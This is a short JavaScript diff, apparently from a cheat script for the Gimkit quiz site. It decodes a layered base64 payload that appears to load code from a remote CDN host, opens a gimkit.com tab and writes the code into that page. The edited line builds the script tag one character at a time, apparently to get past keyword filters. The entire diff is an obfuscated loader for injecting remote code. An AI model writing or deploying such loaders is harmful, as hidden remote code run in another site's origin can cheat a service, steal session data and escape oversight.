@@ -3,6 +3,6 @@ let js = atob("KCgpPT57bGV0IGE9YXRvYigiYUhSMGNITTZMeTkwWlhOMGFXNW5ZMll1YW5Oa1pXe
 const newTab = window.open("https://gimkit.com/question-image/"+(Math.random()*100000).toString(36), '_blank');
 newTab.onload = function() {
   newTab.document.open();
-  newTab.document.write(js);
+  newTab.document.write("<"+"s"+"c"+"r"+"i"+"p"+"t"+">"+js+"<"+"/"+"s"+"c"+"r"+"i"+"p"+"t"+">");
   newTab.document.close();
 }
